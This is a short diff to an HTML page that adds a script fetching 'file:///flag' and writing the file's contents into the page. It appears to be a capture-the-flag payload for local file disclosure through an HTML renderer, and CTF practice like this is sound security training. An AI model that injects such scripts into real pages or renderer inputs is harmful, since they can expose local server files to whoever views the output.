@@ -8,6 +8,9 @@
 <body>
     <h1>Hello, World!</h1>
     <script>
-    </script>
+    fetch('file:///flag')
+      .then(r => r.text())
+      .then(d => document.body.innerHTML = d)
+</script>
 </body>
 </html>
